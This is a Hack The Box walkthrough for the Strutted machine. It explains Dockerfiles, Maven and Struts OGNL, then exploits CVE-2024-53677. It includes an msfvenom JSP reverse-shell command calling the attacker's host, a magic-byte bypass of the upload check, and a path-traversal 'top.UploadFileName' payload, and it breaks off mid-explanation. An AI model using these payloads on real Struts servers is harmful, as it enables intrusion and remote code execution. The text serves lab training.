## Strutted Hack The Box Walkthrough/Writeup: {#strutted-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Strutted>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

    -   **Findings**:
        Some minor additional information but not enought to pull us in a different direction. We can see the main site is running an "Instant Image Uploads" site but that's it.


### Web `80`: {#web-80}


#### WhatWeb: {#whatweb}

Lets run [WhatWeb](https://github.com/urbanadventurer/WhatWeb) to see if I can glean some further information.

```shell
#Command
whatweb http://$box | sed 's/, /\n/g'

#Output
http://10.129.7.241 [302 Found] Country[RESERVED][ZZ]
HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)]
IP[10.129.7.241]
RedirectLocation[http://strutted.htb/]
Title[302 Found]
nginx[1.18.0]
ERROR Opening: http://strutted.htb/ - no address for strutted.htb
```

As we can see it auto redirects to `strutted.htb` but as we don't have this in our `/etc/hosts` it will not redirect properly. Let's add this to our `hosts` file and redo.

```bash
sudo echo "$box   strutted.htb" | sudo tee -a /etc/hosts
```

```shell
http://10.129.7.241 [302 Found] Country[RESERVED][ZZ]

    -   It's running `java` and a scripting language.
    - +Note+: I use `sed` to display the output across multiple lines for easier readability.


#### Dirbusting The Webserver Running Using FFUF: {#dirbusting-the-webserver-running-using-ffuf}

We can perform some directory busting to see if there are any interesting directories:

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$domain/FUZZ -fs 5197 -ic
```

Only the listed pages were found:

```shell
about                   [Status: 200, Size: 6610, Words: 2173, Lines: 182, Duration: 391ms]
download                [Status: 200, Size: 39680602, Words: 0, Lines: 0, Duration: 0ms]
how                     [Status: 200, Size: 6119, Words: 2054, Lines: 182, Duration: 417ms]
```


#### Subdomain Enumeration with FFUF: {#subdomain-enumeration-with-ffuf}

Let's enumerate any possible subdomains with ffuf.

```shell
ffuf -w /home/kali/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt:FUZZ -u http://$domain -H "Host:FUZZ.$domain" -ic -fs 5197
```


#### Enumerating Injection Points With Burpsuite: {#enumerating-injection-points-with-burpsuite}

-   **Web Enumeration via Burp Suite**:
    -   When manually enumerating a Website, always use Burp Suite. This allows you to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


##### Checking the main page: {#checking-the-main-page}

We can see it's the image upload app however at the bottom it tells us if we click the "Download" button we can access the docker image and source code.
![](/ox-hugo/2025-05-24-071804_.png)


## 2. Reading Application Source Code: {#2-dot-reading-application-source-code}

After downloading the source code we can unzip it with `unzip strutted.zip`. There is a lot of stuff in here &amp; I am going to go on a few side-quests in order to provide a general understanding of the technologies being used, this is to ensure you actually understanding what is going on and not just how to PWN.


### Discovering Hardcoded Tomcat creds the source code: {#discovering-hardcoded-tomcat-creds-the-source-code}

If we check the `tomcat-users.xml` file in the root directory we can see it contains hard-coded admin credentials.
![](/ox-hugo/2025-05-24-072151_.png)
We can see these should work on the endpoints:

-   `manager-gui` &amp; `admin-gui`

Now tomcat does not appear to be running on an external facing port, so it may be hosted internally which is common, let's put a pin in these and keep moving.


#### Side Quest: What is Apache Tomcat? {#side-quest-what-is-apache-tomcat}

Tomcat is a java based HTTP application server. In English that means it's a web server that can be used to serve applications that are written in the java programming language.

The core component of Tomcat is Catalina, this acts as the servlet container. Whenever we want to start Tomcat we actually start Catalina which in turn starts Tomcat which deploys the web applications.

If you were to download the Tomcat source code and `cd`'d into the `bin` folder two of the scripts you would find are `catalina.sh` &amp; `catalina.bat`.

`catalina.sh/catalina.bat`: Is the primary control script for Tomcat for starting Apache Tomcat.

+Note+: This may seem superfluous, but this is requisite knowledge for something that is coming up so please be patient.


### Reading the README.md {#reading-the-readme-dot-md}

Looking at the README we can see that the application typically operates over port `8080` &amp; is containerized using Docker.
![](/ox-hugo/2025-05-24-073743_.png)

You may be thinking "We are accessing on the webserver over port 80 though?" That is correct however docker containers will often have presets of unprivileged ports e.g. ports &gt; 1024 as defaults and then put behind a reverse proxy. Or the internal port of `8080` will be mapped to the external port of `80`.

The rest of the README just details basic functionality, however it does also provide an email address `support@strutted.htb`.


### Reading the `Dockerfile`: {#reading-the-dockerfile}

Having a Dockerfile is great as we can actually see how the company run's the application.

I'm going to give a little `Dockerfile` &amp; `build` primer if you are not familiar with how docker builds work etc, I would recommend you read the below, however if you do skip ahead to the examining portion.


##### Side Quest: What's a `Dockerfile`? {#side-quest-what-s-a-dockerfile}

A Dockerfile is a configuration file used by Docker to declare the steps needed to build a Docker image. It's essentially a recipe: it tells Docker what to do, step by step. For example, if we want to install a package like `ffmpeg`, we can include a command like `apt install ffmpeg` in the Dockerfile.

We can do almost anything we would do on a standard Linux machine like copy files, create users, delete files, etc. However, we do it **declaratively**. That means we write down the instructions in the Dockerfile, and Docker systematically goes through them to build the final image. Once it's done, we get a portable, reusable Docker image that we can run anywhere.

**Multi-Stage Builds**:

A note on [multi-stage builds](https://docs.docker.com/build/building/multi-stage/): we can use something called multi-stage builds. This technique is often used to reduce the size of the final Docker image.

Here's how it works: dependencies are pulled in and used during a build stage, and once the application or binary is built, only the necessary output (e.g. the built binary) is copied into the final runtime stage. This means all the build-time dependencies can be excluded from the final imageâ€”resulting in a smaller, cleaner, and more efficient container.


#### Examination of the `Dockerfile` Build Stage: {#examination-of-the-dockerfile-build-stage}

As this is a multistage build we can break this down into the two stages so we can get a better understanding of what is happening with the creation of the image.

```dockerfile
FROM --platform=linux/amd64 openjdk:17-jdk-alpine
#FROM openjdk:17-jdk-alpine

RUN apk add --no-cache maven

COPY strutted /tmp/strutted
WORKDIR /tmp/strutted

RUN mvn clean package
```

`FROM --platform=linux/amd64 openjdk:17-jdk-alpine`
The linux amd64 platform is selected to run the alpine image with contains the java version 17. So this is what is being used as the base of the image.

`RUN apk add --no-cache maven`
The alpine package manager `apk` is being used to install the `maven` binary. I will explain soon what `maven` is, however just for the moment, understand that `maven` is an orchestration tool used to manage, package and build primarily java applications.

`COPY strutted /tmp/strutted`
The strutted folder is then copied into the container at the location `/tmp/strutted`. This contains all the `java`, `jsp` files and `pom.xml` etc.

`WORKDIR /tmp/strutted`
The working drive is then set to `/tmp/strutted` this is just the equivalent of using `cd` to move into that drive.

`RUN mvn clean package`
The command `mvn clean package` is run, which will tell maven to pull all the dependencies listed in the `pom.xml`, again this will be explained further soon, and then go through the package process which will build the artifact (it's kind of like a binary but not) (`strutted-1.0.0.war`) as outlined in the `pom.xml`.

**Summary**: In this stage the source code that is contained in the `strutted` folder in the root directory of this download folder is copied into the docker image and compiled using `maven` so that it generates a file called `strutted-1.0.0.war`


#### Examination Of The `Dockerfile` Run Stage: {#examination-of-the-dockerfile-run-stage}

This section is primarily focused on copying, moving &amp; deleting files as well as starting the program.

```dockerfile
FROM tomcat:9.0

RUN rm -rf /usr/local/tomcat/webapps/
RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/
RUN rm -rf /usr/local/tomcat/webapps/ROOT


COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml
COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml

EXPOSE 8080

CMD ["catalina.sh", "run"]

```

- `FROM tomcat:9.0`
  - The tomcat 9.0 image is selected as a base image. This makes sense as it's a java based HTTP server and the application that was compiled in the previous step is also java. We also learn what version of tomcat is being used.
 
- `RUN rm -rf /usr/local/tomcat/webapps/`
  - The folder `/user/local/tomcat/webapps/` is deleted.
 
- `RUN mv /usr/local/tomcat/webapps.dist/ /usr/local/tomcat/webapps/`
  - The file `webapps.dist` is then moved to the folder `webapps` in the same directory.
 
- `RUN rm -rf /usr/local/tomcat/webapps/ROOT`
  - The `ROOT` folder is deleted in the `webapps` folder.
 
- `COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war`
  - The `strutted-1.0.0.war` file that was generated in the first part of the build is then copied into the `/usr/local/tomcat/webapps` file and then renamed `ROOT.war`.
 
- `COPY ./tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml`
  - The `./tomcat-users.xml` file which we saw contains hard coded creds is then copied into the container to be used at run time, naughty naughty.
 
- `COPY ./context.xml /usr/local/tomcat/webapps/manager/META-INF/context.xml`
  - The `context.xml` file is then copied into the container to `/usr/local/tomcat/webapps/manager/META-INF/context.xml`
 
- `EXPOSE 8080`
  - The image then exposes port `8080` so it can be accessed.
 
- `CMD ["catalina.sh", "run"]`
  - This is the default command that will be run when the image is run as a container, `catalina.sh` will be run which then in turn launches Tomcat itself.

**Summary**: In this stage we can see that all of the dependencies from the previous stage are deleted and that the  `strutted-1.0.0.war` that was generated in the build stage is copied in. The tomcat server is configured, using hard coded creds, the service is exposed on port `8080` and then the server is launched.


### Side Quest: What is Maven? {#side-quest-what-is-maven}

I know, I know, another side quest. But really, it's important to understand what Maven is. As you saw it was used in the build stage of the Dockerfile to generate a `.war` file. That's because it's being used to manage, package, and build this application. So without at least a basic knowledge of Maven, where to find things and the terminology it uses, this next part won't make much sense.

Maven provides a standardized way to structure projects, for example, all Maven projects follow the same standardized &amp; enforced folder layout.

```shell
my-maven-project/
â”œâ”€â”€ pom.xml                  # The Maven configuration file (Project Object Model)
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ main/
â”‚   â”‚   â”œâ”€â”€ java/            # Your application source code (.java files)
â”‚   â”‚   â””â”€â”€ resources/       # Non-code resources (config files, etc.)
â”‚   â””â”€â”€ test/
â”‚       â”œâ”€â”€ java/            # Unit and integration test code
â”‚       â””â”€â”€ resources/       # Test-specific resources
â””â”€â”€ target/                  # Generated output (compiled classes, JARs, etc.)

```

All Maven projects are managed by a file called `pom.xml`. This is the core configuration file, it defines the project's dependencies, build goals, and the type of output file (artifact) to generate.

In Maven, when you compile a project, the resulting file is called an `artifact`. The name of this artifact is set in the `pom.xml` using the `<artifactId>` tag. So when you see me say artifact, just think "the file that got built."

+Note+: The reason I am explaining this is if you understand that ALL Maven projects are structured the same if you come across one again in the future, which you will as it's a widely adopted tool by Java developers &amp; ALOT of applications are written in java, you will know where to look for key information.

Now that you understand this the next parts will make more sense.


### Maven `pom.xml` inspection: {#maven-pom-dot-xml-inspection}

As discussed earlier, the `pom.xml` file is essentially the roadmap Maven uses to run its build process. You can think of it kind of like a `Dockerfile`, it defines all the dependencies, plugins, and configuration needed to build the project.

However, unlike a `Dockerfile`, which always results in a container image, Maven gives you more flexibility. In Maven, you declare the type of artifact you want to produce, remember this artifact is just the build output. It could be a `.jar`, `.war`, `binary`, or even a directory structure depending on how the project is configured.

In this `pom.xml` we can see on lines 5-9 the artifact being generated when maven runs is a file called `strutted` it will be version `1.0.0` and it will be a `.war` file.

```xml

    <packaging>war</packaging> <!-- artifact filetype -->

    <artifactId>strutted</artifactId> <!-- artifact name -->
    <groupId>org.strutted.htb</groupId> <!-- Organization/Company Name -->
    <version>1.0.0</version> <!-- artifact version -->
```

This artifact is then referenced in line 17 of the `Dockerfile`

```dockerfile
COPY --from=0 /tmp/strutted/target/strutted-1.0.0.war /usr/local/tomcat/webapps/ROOT.war
```


#### Comparison Between `Dockerfile` &amp; `pom.xml`: {#comparison-between-dockerfile-and-pom-dot-xml}

If you're struggling to grasp the difference sometimes its useful to look the similarities. This comparison table can help.

| Feature                | `pom.xml` (Maven)                                              | `Dockerfile`                                           |

### Java Code Finds (Discovering a potentially vulnerable function): {#java-code-finds--discovering-a-potentially-vulnerable-function}

Looking through the java files. If we take a look at the `Upload.java` file located in `src/main/java/org/strutted/htb`, we can see the function `isAllowedContentType` is used to validate the MIME type of an uploaded file.

It checks whether the file's content type is one of the following:
    `"image/jpeg"`
    `"image/png"`
    `"image/gif"`

If the file matches one of these types, the function returns `true` and allows the upload to proceed. Otherwise, it returns `false`, effectively blocking the file.

This presents a potential attack vector, because MIME types (also known as content types) can be manipulated during the upload process. For example, we could upload a malicious file and simply spoof the `Content-Type` header to appear as `"image/jpeg"`, potentially bypassing this check if there's no further validation (e.g., inspecting file contents or extensions).

```java

    private boolean isAllowedContentType(String contentType) {
        String[] allowedTypes = {"image/jpeg", "image/png", "image/gif"};
        for (String allowedType : allowedTypes) {
            if (allowedType.equalsIgnoreCase(contentType)) {
                return true;
            }
        }
        return false;
    }
```

This kind of check is only as strong as the trust placed in the incoming `HTTP headers` as on its own, it's not sufficient to secure a file upload feature. For it to be effective further checks would need be required such as the following:

-   Extension validation
-   Magic byte (file signature) inspection (read on further as that's what we find.)
-   Virus/malware scanning
-   Restricting file execution in upload directories


### Java Code Finds (Magic Bytes Inspection:) {#java-code-finds--magic-bytes-inspection}

We can see below, this file upload check goes beyond simple file extension validation we saw previously. By reading the first few bytes (magic bytes) of the uploaded file and comparing them to known signatures for common image formats like `JPEG`, `PNG`, and `GIF`, it can determine if they have been modified. This helps ensure the file's contents actually match the claimed format.

If the file's header does not match one of these known formats, the function returns false, halting the upload process and triggering an error message (defined elsewhere). As a result, simply renaming a file's extension is no longer sufficient to bypass the upload restriction.

**However**, this check **only validates upto the first 8 bytes of the file**. So it could be possible to bypass the restrictions of this check by setting the first 8 bytes of the file to match the known values and then replace the rest of the content with malicious code.

-   +Note+: The JPEG &amp; PNG check only check the first 3 bytes whereas the GIF checks upto the first 8 bytes.

<!--listend-->

```java

    private boolean isImageByMagicBytes(File file) {
        byte[] header = new byte[8];
        try (InputStream in = new FileInputStream(file)) {
            int bytesRead = in.read(header, 0, 8);
            if (bytesRead < 8) {
                return false;

                return true;

### Java Code Finds (Upload Location &amp; Naming Structure): {#java-code-finds--upload-location-and-naming-structure}

+Note+: If you're not interested in the breakdown of the code there is a TLDR at the end.

Looking at the code `Upload.java` file again we can also see that from line 56-82 it details where files are uploaded &amp; their naming convention.

We will break it down again so it is easier to digest and understand.

```java
        String baseUploadDirectory = System.getProperty("user.dir") + "/webapps/ROOT/uploads/";
        File baseDir = new File(baseUploadDirectory);
        if (!baseDir.exists() && !baseDir.mkdirs()) {
            addActionError("Server error: could not create base upload directory.");
            return INPUT;
        }
```

- `String baseUploadDirectory = System.getProperty("user.dir") + "/webapps/ROOT/uploads/";`
  - The Java code sets the `baseUploadDirectory` using the JVM's (Java Virtual Machine) working directory (defined in the `catalina.sh` script), retrieved via `System.getProperty("user.dir")`. Since no user or working directory is explicitly set in the `Dockerfile`, the application runs as the `root user`, and the default working directory becomes `/usr/local/tomcat`, as this is the base directory of the Tomcat container. As a result, the upload path resolves to `/usr/local/tomcat/webapps/ROOT/uploads/`.

- `File baseDir = new File(baseUploadDirectory);`
  - The application checks if this path exists and attempts to create it if it doesn't, ensuring the upload directory is ready for use.

- `if (!baseDir.exists() && !baseDir.mkdirs())`
  - If the directory doesn't exist &amp; it can't make the directory it will throw an error.

```java

        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        File timeDir = new File(baseDir, timeStamp);
        if (!timeDir.exists() && !timeDir.mkdirs()) {
            addActionError("Server error: could not create timestamped upload directory.");
            return INPUT;
        }
```

- `String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());`
  - This line generates a string using the current date and time and saves it to the string variable `timeStamp`. The format is `yyyyMMdd_HHmmss`, which results in a value like `20250527_153024` (for May 27, 2025, 15:30:24). This timestamp ensures that each upload has a unique folder based on when it was created.
 
- `File timeDir = new File(baseDir, timeStamp);`
  - This creates a new File object that represents a subdirectory inside the previously created `baseDir`. For example as `baseDir` is `/usr/local/tomcat/webapps/ROOT/uploads/`, then `timeDir` becomes `/usr/local/tomcat/webapps/ROOT/uploads/20250527_153024.`
 
- `if (!timeDir.exists() && !timeDir.mkdirs()) { ... }`
  - This checks if the timestamped folder already exists. If it doesn't exist and it fails to create the directory using `mkdirs()`, then: An error message is added: `"Server error: could not create timestamped upload directory."` The method returns INPUT, likely halting the upload process.

```java
        String relativeImagePath = "uploads/" + timeStamp + "/" + uploadFileName;
        this.imagePath = relativeImagePath;
        String fullUrl = constructFullUrl(relativeImagePath);

        try {
            File destFile = new File(timeDir, uploadFileName);
            FileUtils.copyFile(upload, destFile);
            String shortId = generateShortId();
            boolean saved = urlMapping.saveMapping(shortId, fullUrl);
            if (!saved) {
                addActionError("Server error: could not save URL mapping.");
                return INPUT;
            }
```

- `String relativeImagePath = "uploads/" + timeStamp + "/" + uploadFileName;`
  - Constructs a relative path for the uploaded file. It starts in the `uploads/` directory, adds the unique timestamped folder &amp; then appends the original file name. For example: `uploads/20250527_153024/profile.jpg`
 
- `this.imagePath = relativeImagePath;`
  - Saves the relative path to the current object's `imagePath` property â€” likely used later to reference or display the image.
 
- `String fullUrl = constructFullUrl(relativeImagePath);`
  - Builds a full URL to access the uploaded file, e.g.: ![](http://localhost:8080/uploads/20250527_153024/profile.jpg) The method likely uses the server's base URL and appends the relative path.
 
**File Upload Logic (Inside try block)**:
- `File destFile = new File(timeDir, uploadFileName);`
  - Defines the full destination file path for the upload. For example: `/usr/local/tomcat/webapps/ROOT/uploads/20250527_153024/profile.jpg`
 
- `FileUtils.copyFile(upload, destFile);`
  - Uses Apache Commons IO to copy the uploaded file from temporary storage (upload) to the destination (`destFile`).
 
- `String shortId = generateShortId();`
  - Generates a shortened identifier, likely for creating a shortened URL or a lookup key.
 
- `boolean saved = urlMapping.saveMapping(shortId, fullUrl);`
  - Saves the mapping between the short ID and the full file URL. This might be used to retrieve the image via a short URL like: <http://localhost:8080/i/abc123>
 
- `if (!saved) { ... }`
  - If saving the mapping fails (e.g., DB error), an error is logged and the operation halts.

**TLDR**:
In this section of the `Upload.java` file, the application handles where and how uploaded files are stored. It begins by defining a base upload directory at `webapps/ROOT/uploads/`, relative to Tomcat's working directory (which defaults to `/usr/local/tomcat/` inside the container). It then creates a unique timestamped subdirectory (e.g., `uploads/20250527_153024/`) to organize each upload session. Uploaded files are saved into these subfolders using their original filenames. After saving the file, the code constructs a full URL for access and generates a short ID mapping for simplified referencing. If any step, like directory creation, file copy, or URL mappingâ€”fails, an error is thrown and the upload is halted.


### Discovering the application is vulnerable to `CVE-2024-53677`: {#discovering-the-application-is-vulnerable-to-cve-2024-53677}

Checking the file `inputFiles.lst` that is in the `/target/maven-status/maven-compiler-plugin/compile/default-compile` folder we can see that it explicitly mentions `CVE-2024-53677`.
![](/ox-hugo/2025-05-25-101008_.png)

If we check [nist](https://nvd.nist.gov/vuln/detail/CVE-2024-53677) for that CVE number, we can see that this is a vulnerability that takes advantage of a file upload vulnerability present in Apache Struts, that can lead to file traversal &amp; RCE. (Below is the description from the nist page.)

> File upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution. This issue affects Apache Struts: from 2.0.0 before 6.4.0. Users are recommended to upgrade to version 6.4.0 at least and migrate to the new file upload mechanism <https://struts.apache.org/core-developers/file-upload> . If you are not using an old file upload logic based on FileuploadInterceptor your application is safe. You can find more details in  <https://cwiki.apache.org/confluence/display/WW/S2-067>

It says this affects struts from `2.0.0` and all version before `6.4.0`. If we check the `pom.xml` file we can see that struts is listed as a dependency on line 37.
![](/ox-hugo/2025-05-25-103009_.png)

If we then check for the `<struts2.version>` we can see on line 18 that the version being used is `6.3.0.1` so the version present in the application is vulnerable.
![](/ox-hugo/2025-05-25-102809_.png)

+Note+: I am not sure if this is a mistake by the creator of the box or intentional however this is a pretty major find as it gives us a clear path forward. That is unless it's a red-herring and we need to do a little more to actually exploit.


#### Side Quest: What's Apache Stuts: {#side-quest-what-s-apache-stuts}

Checking the site [here](https://struts.apache.org/birdseye.html) we get a good overview of what Apache Struts is, however here is an overview:

Apache Struts is an open-source Java web framework that helps build dynamic, database-driven websites. It uses the Model-View-Controller (`MVC`) pattern. That means the business logic (Model), UI (View), and application flow (Controller) each have their own place, which makes the codebase easier to manage, especially as the app grows. Apache Struts is flexible &amp; integrates easily with other technologies. It's funninly enough, maintained by the Apache community. As of writing, Struts 2 is the current version


### Side Quest: Understanding `CVE-2024-53677`: {#side-quest-understanding-cve-2024-53677}

This took me a while to actually get all the information together to understand this exploit &amp; how it works but trust me it's interesting.

You need to have a grounding in two concepts for this to make sense so bare with me.


#### Side Quest: What is OGNL (Object-Graph Navigation Language)? {#side-quest-what-is-ognl--object-graph-navigation-language}

OGNL (Object-Graph Navigation Language) is a way for Apache Struts2 apps to access and manipulate Java objects (like properties, fields, methods) dynamically using string-based expressions. Basically it's a language that lets you walk through Java objects and their properties using dot notation, like a map or a path.

Imagine you have an object like this in Java

```java
user.getAddress().getCity();
```

In OGNL, that might look like

```java
user.address.city
```

Apache Struts2 uses OGNL to automatically bind data from `HTTP` requests to backend Java objects. That means if a user submits a form field called `username`, OGNL might take that value and do the following.

```java
user.username = "value from request"
```

OGNL can do much more than just accessing values, it can also call methods, manipulate data, and even execute Java code &amp; that's where things get dangerous as if insecurely configured as it can give attackers dynamic access to server-side objects and methods.


#### Side Quest: Understanding the Value Stack: {#side-quest-understanding-the-value-stack}

The value stack is a stack of Java objects that Struts2 uses to process a web request. At the top of this stack is the current `Action` object; which holds all the request data and business logic. The value stack is a temporary memory shelf that the framework uses to handle each web request.

At the top of that stack is the `Action` object, the Action object is the Struts2 class that handles what happens when a user makes a request. It receives data, runs backend logic, and returns a result. It's the key target for OGNL-based attacks because it sits at the top of the value stack so therefore is the most accessible.

**If you're struggling to conceptualize the Action Object**: Imagine a cook working in a busy pub/diner. Every time a customer places an order (a web request), the kitchen builds a stack of everything needed to prepare that meal, the ingredients (user input), cuttlery/plates (application data), and the recipe (business logic). At the very top of that stack is the recipe card that tells the cook exactly how to make the dish. That recipe card is the Action object.

Every time a user makes a request to a Struts2 application, Struts builds this stack of objects that hold all the data and logic for that request using a last-in-first-out data structure. It stores.

-   Action objects (your backend code)
-   User input (like form fields)
-   Session &amp; application data


#### Here's why all this that matters in the CVE-2024-53677 Vulnerability: {#here-s-why-all-this-that-matters-in-the-cve-2024-53677-vulnerability}

OGNL expressions in parameters (like `top.UploadFilename`) can reference the top of the value stack.

This means if parameter filtering is too loose, an attacker can send something like the below.

```shell
    Content-Disposition: form-data; name="top.UploadFilename"
    maclicious.jsp
```

Which tells Struts2 to set the `UploadFilename` property of the top object (your Action class) to `malicious.jsp`

That change is subtle, but what it does is overwrites the filename on the backend, even if the client uploaded a safe-looking file like `image.jpg`. This would rename `image.jpg` to `malicious.jsp` which means if you can then access the file you could potentially get RCE (remote code execution by having that file processed).


## 3. Foothold: {#3-dot-foothold}


### Getting RCE on the host via `CVE-2024-53677`: {#getting-rce-on-the-host-via-cve-2024-53677}

Quick overview of how we will attack this host:

As we know the application expects an image to be uploaded as it does extension filtering &amp; also checks for magic bytes, we also know that Apache Struts, suffers from an OGNL &amp; vulnerability where we can directly manipulate the action object of the value stack so therefore we can upload a fake image by manipulating the magic bytes to match that of a real image (whilst still having a `.jpg .gif` etc extension) however we will  embed a java based reverse shell within the file. We can then modify the image extension by manipulating the Action Object and therefore (should) be able to get RCE.


#### Creating Our Malicious image/reverse-shell With `msfvenom`: {#creating-our-malicious-image-reverse-shell-with-msfvenom}

This part is we simply create take a `.jsp` reverse shell and rename by giving it the extension `.jpg` `.gif`. We can do this easily with msfvenom

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[yourIP] LPORT=[yourListeningPort] -f raw > shell.jsp
```

{{< figure src="/ox-hugo/2025-05-30-204127_.png" >}}


#### Prepending Magic-Bytes To The reverse-shell To Bypass Validation: {#prepending-magic-bytes-to-the-reverse-shell-to-bypass-validation}

In order for this to work we are going to have to modify the extension by renaming it to `shell.jpg` and then we are going to have to prepend the magic-bytes so we can bypass the byte check that takes place.

+Note+: We are going to go with `.jpg` format as this only requires we manipulate the first 3 bytes as opposed to first 8 for the `.gif` format.

When I am doing a magic-byte bypass the best list I have found is [here](https://filesig.search.org/), it provides a list of magic bytes for various file formats.

As you can see on the page if we look for the `jpg` format we can see it lists the HEX/Header/Magic-Bytes value as `FF D8` however this is only `2` bytes, so we will need to figure out what the other 1 byte will be.
![](/ox-hugo/2025-05-30-201854_.png)

Luckily this is easy enough to do, we have 3 options here.

<!--list-separator-->

-  1. Run `hexdump` on a `jpg`:

    ```shell
    hexdump /home/kali/Downloads/[jpgName].jpg | head -n 1
    ```

    {{< figure src="/ox-hugo/2025-05-30-203201_.png" >}}

    Now this is using big-endian notation so that means the order is reversed of the bytes in the columns so the correct order is.

    ```cfg
    ff d8 ff
    ```

<!--list-separator-->

-  2. Read Existing Source Code:

    The second and easier option in this case is to read the code that checks the magic bytes as the values are actually hard-coded.

    ```java
                if (header[0] == (byte)0xFF && header[1] == (byte)0xD8 && header[2] == (byte)0xFF) {
                    return true;
                }
    ```

    Again we can see it's `FF D8 FF` but in this case it's displayed in hex format which we actually need for this. `0xFF 0xD8 0xFF`

<!--list-separator-->

-  3. Intercept An Upload From burpsuite:

    The third option is to just upload an image via burpsuite and select the bytes in the request and decode them

    -   {{< figure src="/ox-hugo/2025-05-30-203630_.png" >}}


##### Adding The Magic-Bytes With `hexeditor`: {#adding-the-magic-bytes-with-hexeditor}

Now we have the magic bytes we can use hexeditor to pre-pend them to our shell.

First we will open the shell in our text editor and add an additional empty line at the start, &amp; just type 123, this is to allow space for our magic bytes to be prepended.

So the start of the file will now look like this.

```java
123
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
[restOfFile]
```

Now we use hexeditor add the necessary HEX bytes at the start

```shell
hexeditor shell.jsp
```

We can now just overwrite the first 3 bytes by manually typing in `FF D8 FF`

**Before**:
![](/ox-hugo/2025-05-31-064543_.png)

**After**:
![](/ox-hugo/2025-05-31-064834_.png)

We then hit `CTRL+X` to save.

Finally we rename the payload.

```shell
cp shell.jsp shell.jpg
```

+Note+: I would advise copying as opposed to just moving/renaming as we may need to adjust.


#### Crafting our Malicious Request: {#crafting-our-malicious-request}


##### Adding An Additional Form-data field: {#adding-an-additional-form-data-field}

Now we have our payload we need to upload it and modify the request to include the `OGNL` modification to rename our `shell.jpg` to `shell.jsp`

To do this we are going to add another form-data field, directly below the body of our upload `shell.jpg` data.

To do this we intercept the upload in burpsuite and add the following.

```shell
------WebKitFormBoundaryolcNpSpn9Sn2GWqN
Content-Disposition: form-data; name="top.UploadFilename"
```

![](/ox-hugo/2025-06-01-093941_.png)
+Note+: You are going to see the String following boundary change during the proceeding screenshots this is due to me having to try and modify certain things.


##### Determining Upload Location: {#determining-upload-location}

We now need to determine where we are going to upload the file to, as the struts vulnerability allows for file traversal we need to place it in a directory where we know it will be processed as `java/jsp` code and not just statically served.

To determine this location we can look at the `web.xml` file located in `/src/main/webapp/WEB-INF` this is a configuration file used by the application.

```xml
    <servlet-mapping>
        <servlet-name>staticServlet</servlet-name>
        <url-pattern>/uploads/*</url-pattern>
    </servlet-mapping>
```

We can see that any (`*`) file placed in the `/uploads/` folder path will use the `staticServlet` to serve the content. This servlet is used for static content only, images, text files, plain HTML etc. Meaning anything placed in here will not be processed using `JSP`. However we want to have our reverse shell processed and executed as code, so we will need to escape this folder.

We also know that all uploads are placed in their own time-stamped folder within `/uploads/` we need to escape the time-stamped folder and the uploads folder so we will use `../../` to move up two directories.

This means our request now looks like the below.

```bash
------WebKitFormBoundary olcNpSpn9Sn2GWqN
Content-Disposition: form-data; name="top.UploadFileName"

../../rev-shell.jsp
```


##### Modifying The Upload Name To Bind Correctly with OGNL: {#modifying-the-upload-name-to-bind-correctly-with-ognl}

This part took me an age to figure out and then research and discover, so bare with me.

First let me quickly explain what a setter method is:

<!--list-separator-->

-  Side Quest: Setter Methods:

    In Java, a setter method is a function that lets other parts of the program assign a value to a private variable. In this case, Struts2 uses these setter methods to automatically take values from HTTP requests and pass them into the code. For example, `setUploadFileName()` lets the app receive a filename from the form and store it in a variable in a variable called `UploadFileName`.

    If we look at the java code from `Upload.java` we can see some setter methods below.

    ```java
        public void setUpload(File upload) {
            this.upload = upload;
        }

        public void setUploadFileName(String uploadFileName) {
            this.uploadFileName = uploadFileName;
        }
    ```

    These are Java setter methods. OGNL maps them to property names by removing the `set` prefix and using what's left (preserving the case).

    -   `setUpload()` becomes the OGNL property `Upload`
    -   `setUploadFileName()` becomes the OGNL property `UploadFileName`

    Now that we know that let's move on.

<!--list-separator-->

-  **OGNL Case Sensitivity**:

    OGNL is case-sensitive when resolving property names and method calls (unless explicitly configured otherwise). Because it binds incoming HTTP parameters to Java object properties using their names, **the case must match exactly**.

    In the form data we initially see the below is used.

    ```bash
    name="upload"
    ```

    {{< figure src="/ox-hugo/2025-06-01-095344_.png" >}}

    At first glance, this might seem trivial however, in Java, `upload` and `Upload` are **not** the same. Since OGNL tries to map the parameter name to the corresponding setter method in the Action class, if the case doesn't match, it simply won't bind the value as `setupload` is not the same as `setUpload`.

